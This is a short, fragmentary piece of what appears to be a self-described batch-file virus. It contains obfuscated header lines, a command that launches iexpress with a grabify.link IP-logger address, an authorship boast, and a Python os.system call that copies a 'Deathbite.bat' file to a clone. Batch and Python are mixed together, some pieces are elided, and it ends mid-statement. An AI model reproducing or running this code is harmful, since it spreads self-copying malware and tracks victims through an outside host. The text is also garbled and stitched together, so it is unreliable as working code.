...
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJH2B9VY4KhJASUqHJG7a
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
start iexpress (https.grabify.link/WH6B78)
@echo off>nul.ViRuS
...
:ViRuS_OLDBAT
echo on>nul.ViRuS
echo This Virus Is Made By 5H4D0W,bystwn22.
:XXX_END
...
os.system(r”copy ” Deathbite.bat ” clone”)
os.system(
